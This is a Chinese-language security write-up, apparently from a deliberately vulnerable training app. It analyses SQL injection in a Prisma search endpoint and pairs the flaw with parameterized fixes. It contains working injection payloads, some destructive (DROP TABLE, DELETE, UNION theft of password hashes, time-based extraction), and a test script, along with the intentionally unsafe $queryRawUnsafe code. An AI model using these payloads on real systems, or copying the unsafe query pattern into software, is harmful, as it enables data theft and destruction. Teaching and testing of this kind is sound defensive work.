# 问题4: 搜索功能SQL注入漏洞 - 详细分析

**文档版本**: 1.0  
**创建日期**: 2026-05-01

---

## 1. 问题描述

搜索功能通过URL参数直接拼接SQL语句，存在严重的SQL注入漏洞。攻击者可以执行任意SQL语句，窃取、修改或删除数据库中的数据。

**典型场景**:
- 攻击者搜索: `' OR '1'='1` 返回所有文章
- 攻击者搜索: `'; DROP TABLE Article;--` 删除整个表
- 攻击者搜索: `' UNION SELECT * FROM User--` 获取所有用户信息
- 攻击者搜索: `' AND SLEEP(5)--` 进行时间盲注

---

## 2. 问题代码位置

**文件**: `server/api/vulnerable/search/articles.get.ts:1-63`

```typescript
import prisma from '../../plugins/prisma';

export default defineEventHandler(async (event) => {
  const query = getQuery(event);
  const keyword = query.keyword as string || '';
  const page = parseInt(query.page as string || '1', 10);
  const pageSize = parseInt(query.pageSize as string || '10', 10);
  
  let articles;
  let total;
  
  if (keyword) {
    const sql = `
      SELECT * FROM Article 
      WHERE status = 'published' 
      AND (title LIKE '%${keyword}%' OR content LIKE '%${keyword}%')
      ORDER BY createdAt DESC
      LIMIT ${(page - 1) * pageSize}, ${pageSize}
    `;
    
    const countSql = `
      SELECT COUNT(*) as count FROM Article 
      WHERE status = 'published' 
      AND (title LIKE '%${keyword}%' OR content LIKE '%${keyword}%')
    `;
    
    const result = await prisma.$queryRawUnsafe(sql);
    const countResult = await prisma.$queryRawUnsafe(countSql);
    
    articles = result;
    total = (countResult as any)[0]?.count || 0;
  } else {
    articles = await prisma.article.findMany({
      where: { status: 'published' },
      orderBy: { createdAt: 'desc' },
      skip: (page - 1) * pageSize,
      take: pageSize,
      include: {
        author: {
          select: {
            id: true,
            username: true,
          },
        },
      },
    });
    
    total = await prisma.article.count({
      where: { status: 'published' },
    });
  }
  
  return {
    success: true,
    data: {
      items: articles,
      total,
      page,
      pageSize,
      totalPages: Math.ceil(total / pageSize),
    },
  };
});
```

---

## 3. 根本原因详细分析

### 3.1 直接拼接SQL字符串

**核心问题**: 使用字符串拼接构建SQL语句，用户输入直接嵌入SQL中。

#### 3.1.1 问题代码分析

```typescript
// ❌ 危险：直接拼接用户输入到SQL中
const keyword = query.keyword as string || '';

const sql = `
  SELECT * FROM Article 
  WHERE status = 'published' 
  AND (title LIKE '%${keyword}%' OR content LIKE '%${keyword}%')
  ORDER BY createdAt DESC
  LIMIT ${(page - 1) * pageSize}, ${pageSize}
`;

// ❌ 使用不安全的原始查询
const result = await prisma.$queryRawUnsafe(sql);
```

#### 3.1.2 为什么 $queryRawUnsafe 是危险的

```typescript
// Prisma提供两种原始查询方式：

// ❌ 不安全：直接执行SQL字符串，存在注入风险
const result = await prisma.$queryRawUnsafe(`SELECT * FROM User WHERE id = ${userId}`);

// ✅ 安全：使用参数化查询
const result = await prisma.$queryRaw`SELECT * FROM User WHERE id = ${userId}`;
```

### 3.2 SQL注入攻击场景分析

#### 3.2.1 场景1: 布尔盲注 - 绕过条件

**攻击者输入**:
```
keyword=' OR '1'='1
```

**生成的SQL**:
```sql
SELECT * FROM Article 
WHERE status = 'published' 
AND (title LIKE '%' OR '1'='1%' OR content LIKE '%' OR '1'='1%')
ORDER BY createdAt DESC
LIMIT 0, 10
```

**实际执行效果**:
- `'1'='1` 永远为真
- 返回所有文章，绕过了搜索条件
- 可以用于遍历整个数据库

#### 3.2.2 场景2: 联合查询注入 - 窃取数据

**攻击者输入**:
```
keyword=' UNION SELECT id, username, password, email, 1, 1, 1, 1 FROM User--
```

**生成的SQL**:
```sql
SELECT * FROM Article 
WHERE status = 'published' 
AND (title LIKE '%' UNION SELECT id, username, password, email, 1, 1, 1, 1 FROM User--%' OR content ...)
```

**实际执行效果**:
- 攻击者可以获取所有用户信息
- 包括用户名、密码哈希、邮箱等敏感数据
- 可以用于进一步的攻击

#### 3.2.3 场景3: 堆叠查询注入 - 破坏数据

**攻击者输入**:
```
keyword='; DROP TABLE Article;--
```

**生成的SQL**:
```sql
SELECT * FROM Article 
WHERE status = 'published' 
AND (title LIKE '%'; DROP TABLE Article;--%' OR content ...)
```

**实际执行效果**:
- 如果数据库支持堆叠查询（如MySQL）
- `Article` 表被完全删除
- 数据永久丢失

#### 3.2.4 场景4: 时间盲注 - 提取数据

**攻击者输入**:
```
keyword=' AND IF(1=1, SLEEP(5), 0)--
```

**生成的SQL**:
```sql
SELECT * FROM Article 
WHERE status = 'published' 
AND (title LIKE '%' AND IF(1=1, SLEEP(5), 0)--%' OR content ...)
```

**实际执行效果**:
- 如果条件为真，数据库会延迟5秒响应
- 攻击者可以逐位提取数据
- 例如：判断用户名的第一个字母是否是 'a'

```sql
-- 逐位提取数据示例
keyword=' AND IF(SUBSTRING((SELECT username FROM User LIMIT 1),1,1)='a', SLEEP(5), 0)--
-- 如果延迟5秒，说明第一个字母是 'a'
```

#### 3.2.5 场景5: 错误注入 - 信息泄露

**攻击者输入**:
```
keyword=' AND extractvalue(1,concat(0x7e,VERSION(),0x7e))--
```

**生成的SQL**:
```sql
SELECT * FROM Article 
WHERE status = 'published' 
AND (title LIKE '%' AND extractvalue(1,concat(0x7e,VERSION(),0x7e))--%' OR content ...)
```

**实际执行效果**:
- 数据库报错，但错误信息包含版本信息
- 攻击者可以获取数据库版本、表结构等信息
- 用于进一步的攻击

### 3.3 page和pageSize参数也可能被注入

```typescript
// ❌ page和pageSize虽然经过了parseInt，但仍然可能有问题
const page = parseInt(query.page as string || '1', 10);
const pageSize = parseInt(query.pageSize as string || '10', 10);

// ❌ 直接拼接到LIMIT子句
LIMIT ${(page - 1) * pageSize}, ${pageSize}

// 如果page或pageSize是NaN（parseInt失败）
// (NaN - 1) * NaN = NaN
// 可能导致意外行为
```

### 3.4 SQL注入攻击的完整流程

```
攻击者
   ↓
1. 发现搜索功能，测试注入点
   URL: /api/vulnerable/search/articles?keyword=test'
   观察是否有错误返回或异常行为
   ↓
2. 确认存在注入
   URL: /api/vulnerable/search/articles?keyword=' OR '1'='1
   返回所有文章，确认注入存在
   ↓
3. 获取数据库信息
   - 数据库类型（MySQL）
   - 数据库版本
   - 表名、列名
   ↓
4. 窃取敏感数据
   - 用户表、密码哈希
   - 订阅信息、支付数据
   - 系统配置、API密钥
   ↓
5. 提升权限
   - 获取管理员账户
   - 执行系统命令
   - 完全控制服务器
```

### 3.5 常见SQL注入Payload

```typescript
// 布尔盲注
"' OR '1'='1"
"' OR 'a'='a"
"' OR 1=1--"
"' OR 1=1#"

// 联合查询
"' UNION SELECT NULL--"
"' UNION SELECT NULL,NULL--"
"' UNION SELECT NULL,NULL,NULL--"
"' UNION SELECT username,password FROM User--"

// 堆叠查询
"'; DROP TABLE Article;--"
"'; DELETE FROM User WHERE 1=1;--"
"'; INSERT INTO User (username,password) VALUES ('hacker','123456');--"

// 时间盲注
"' AND SLEEP(5)--"
"' AND IF(1=1,SLEEP(5),0)--"
"' AND WAITFOR DELAY '0:0:5'--"

// 错误注入
"' AND extractvalue(1,concat(0x7e,VERSION(),0x7e))--"
"' AND updatexml(1,concat(0x7e,VERSION(),0x7e),1)--"
"' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
```

---

## 4. 问题复现步骤

### 4.1 环境准备

1. **启动目标服务器**:
```bash
cd server-backend
npm run dev
```

### 4.2 攻击脚本

```typescript
// sql-injection-test.ts

const BASE_URL = 'http://localhost:3000';

async function testSqlInjection() {
  console.log('=== SQL注入漏洞测试 ===\n');

  // 测试1: 正常搜索
  console.log('1. 正常搜索测试...');
  const normalResult = await search('test');
  console.log('   正常搜索返回:', normalResult.data?.total, '条记录');

  // 测试2: 布尔盲注 - 返回所有文章
  console.log('\n2. 布尔盲注测试 (OR注入)...');
  const blindResult = await search("' OR '1'='1");
  console.log('   注入后返回:', blindResult.data?.total, '条记录');
  if (blindResult.data?.total > normalResult.data?.total) {
    console.log('   ❌ 发现SQL注入漏洞！返回了更多记录');
  }

  // 测试3: 联合查询注入
  console.log('\n3. 联合查询注入测试...');
  try {
    const unionResult = await search("' UNION SELECT 1,2,3,4,5,6,7,8--");
    console.log('   联合查询可能成功');
  } catch (error) {
    console.log('   联合查询测试:', (error as Error).message);
  }

  // 测试4: 时间盲注
  console.log('\n4. 时间盲注测试 (SLEEP)...');
  const startTime = Date.now();
  try {
    await search("' AND SLEEP(3)--");
  } catch (error) {
    // 忽略错误
  }
  const duration = Date.now() - startTime;
  
  if (duration > 2500) {
    console.log('   ❌ 发现时间盲注漏洞！延迟了', duration, 'ms');
  } else {
    console.log('   时间盲注测试完成，耗时:', duration, 'ms');
  }

  // 测试5: 注释绕过
  console.log('\n5. 注释绕过测试...');
  try {
    const commentResult = await search("admin'--");
    console.log('   注释绕过测试完成');
  } catch (error) {
    console.log('   注释绕过测试:', (error as Error).message);
  }
}

async function search(keyword: string) {
  const url = new URL(`${BASE_URL}/api/vulnerable/search/articles`);
  url.searchParams.set('keyword', keyword);
  
  const response = await fetch(url.toString());
  return await response.json();
}

testSqlInjection()
  .then(() => console.log('\n=== 测试完成 ==='))
  .catch(console.error);
```

### 4.3 预期结果

运行测试脚本后，如果看到以下输出，说明存在漏洞：

```
=== SQL注入漏洞测试 ===

1. 正常搜索测试...
   正常搜索返回: 5 条记录

2. 布尔盲注测试 (OR注入)...
   注入后返回: 100 条记录
   ❌ 发现SQL注入漏洞！返回了更多记录

3. 联合查询注入测试...
   联合查询可能成功

4. 时间盲注测试 (SLEEP)...
   ❌ 发现时间盲注漏洞！延迟了 3045 ms

5. 注释绕过测试...
   注释绕过测试完成

=== 测试完成 ===
```

---

## 5. 根本原因总结

| 问题层级 | 具体问题 | 根本原因 |
|----------|----------|----------|
| **API设计** | 直接拼接SQL字符串 | 使用字符串模板构建SQL |
| **ORM使用** | 使用$queryRawUnsafe | 没有使用参数化查询 |
| **输入验证** | 没有验证搜索关键词 | 用户输入直接嵌入SQL |
| **安全意识** | 没有意识到注入风险 | 认为搜索关键词"只是字符串" |

### 5.1 核心问题

1. **字符串拼接SQL**:
   ```typescript
   // ❌ 危险
   const sql = `SELECT * FROM Article WHERE title LIKE '%${keyword}%'`;
   
   // ✅ 安全
   const articles = await prisma.article.findMany({
     where: {
       title: { contains: keyword }
     }
   });
   ```

2. **使用不安全的原始查询**:
   ```typescript
   // ❌ 危险
   await prisma.$queryRawUnsafe(sql);
   
   // ✅ 安全
   await prisma.$queryRaw`SELECT * FROM Article WHERE title LIKE ${'%' + keyword + '%'}`;
   ```

3. **缺少输入验证**:
   - 没有验证关键词的格式
   - 没有限制关键词的长度
   - 没有过滤危险字符

---

## 6. 相关代码文件

| 文件路径 | 问题类型 | 状态 |
|----------|----------|------|
| `server/api/vulnerable/search/articles.get.ts` | SQL注入（字符串拼接） | ❌ 有问题 |
| `server/api/fixed/search/articles.get.ts` | 已修复（参数化查询+验证） | ✅ 修复 |
| `server/utils/search-utils.ts` | 搜索安全工具类 | ✅ 新增 |
